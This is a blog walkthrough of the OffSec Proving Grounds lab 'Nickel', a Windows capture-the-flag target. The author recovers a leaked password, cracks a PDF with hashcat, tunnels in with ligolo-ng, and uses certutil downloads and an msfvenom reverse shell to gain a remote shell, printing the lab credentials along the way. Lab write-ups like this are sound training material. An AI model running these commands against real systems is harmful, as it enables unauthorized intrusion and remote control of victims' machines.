---
title: Nickel
date: 2026-04-06T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - macros
  - proving-grounds
  - ligolo-ng
  - base64
  - winpeas
  - http
  - web
  - Caido
  - Hashcat
  - ftp
  - ssh
  - revshells
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Nickel"
---



"Mistakes are the usual bridge between inexperience and wisdom."

-- Phyllis Theroux

This was an fun lab, I need more practice with setting up and using logolo tunnels :)

`nmap 192.168.182.99 -p- -sS -sC -sV --min-rate 5000 > nmap-A.txt`

![](Screenshot%202026-04-05%20at%2011.08.21.png)

![](Screenshot%202026-04-05%20at%2010.58.31.png)

![](Screenshot%202026-04-05%20at%2011.07.42.png)
![](Screenshot%202026-04-07%20at%2015.30.10.png)

![](Screenshot%202026-04-05%20at%2011.11.56.png)
At this point I checked a guide. I wouild have neve guessed to use a PUT request. Maybe if had used caido to run an active scan.

![](Screenshot%202026-04-07%20at%2015.40.34.png)

If we use Caido and run an active scan: 

![](Screenshot%202026-04-07%20at%2015.44.18.png)

![](Screenshot%202026-04-07%20at%2015.46.03.png)

Its telling us what to do here but I missed it. 🤷🏼‍♂️

`curl -X POST http://192.168.156.99:33333/list-running-procs -d ""`

![](Screenshot%202026-04-07%20at%2013.14.14.png)
![](Screenshot%202026-04-07%20at%2013.14.36.png)

This is base64 encoded, when decrypted it reveals the password for ariah: NowiseSloopTheory139

`base64 -d ariah`

![](Screenshot%202026-04-07%20at%2013.16.16.png)

FTP:

`ftp ariah@192.168.156.99`

![](Screenshot%202026-04-07%20at%2013.18.41.png)

Download the pdf and open.

![](Screenshot%202026-04-07%20at%2013.20.49.png)

I tried the same FTP password but it didn't work. 

Extract the pdf password hash:

pdf2john will grab the hash.

`pdf2john Infrastructure.pdf > pdf_hash.txt`

Hashcat:

Remove the filename so it looks like this: 
![](Screenshot%202026-04-07%20at%2013.37.43.png)

`hashcat -m 10500 pdf_hash.txt /usr/share/wordlists/rockyou.txt`

![](Screenshot%202026-04-07%20at%2013.27.38.png)


![](Screenshot%202026-04-07%20at%2013.38.48.png)

ariah4168

![](Screenshot%202026-04-07%20at%2013.42.45.png)

Ligolo-ng:

`sudo ip tuntap add user $(whoami) mode tun ligolo`
`sudo ip link set ligolo up`

`sudo ligolo-ng-proxy -selfcert`

![](Screenshot%202026-04-07%20at%2014.37.26.png)

SSH in to the machine using ariah's credentials.

`ssh ariah@192.168.156.99`  
password:`NowiseSloopTheory139`

Create a temp folder, cd into it and move a ligolo agent onto the victim machine:

`mkdir C:\temp`  
`certutil -f -urlcache http://192.168.45.173/agent.exe agent.exe`

![](Screenshot%202026-04-07%20at%2014.32.31.png)

`.\agent.exe -connect 192.168.45.173:11601 -ignore-cert`

![](Screenshot%202026-04-07%20at%2014.32.14.png)

![](Screenshot%202026-04-07%20at%2013.54.30.png)

Once you have see the agent join, start the tunnel:  
Session > 1 > start

Add a route to the victim:

`sudo ip route add 240.0.0.1/32 dev ligolo`

`nmap 240.0.0.1 -p-  -Pn  --min-rate 5000`

![](Screenshot%202026-04-07%20at%2014.41.12.png)

Very different from out public ports.

Lets try to hit the `http://nickel/?` address.

`curl http://240.0.0.1/?whoami`

![](Screenshot%202026-04-07%20at%2014.26.51.png)

We have successfully created a tunnel, 240.0.0.1 is mapped to 127.0.0.1 or localhost.

Create a reverse shell executable.

Kali machine:  
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.240 LPORT=80 -f exe -o rev.exe`
`updog -p 80`

Victim machine:  
`certutil -f -urlcache http://192.168.45.173/rev.exe rev.exe`

Kali:  
`rlwrap nc -lvnp 80`

`curl http://240.0.0.1/?c:/temp/rev.exe`

![](Screenshot%202026-04-07%20at%2015.28.41.png)

![](Screenshot%202026-04-07%20at%2012.41.16.png)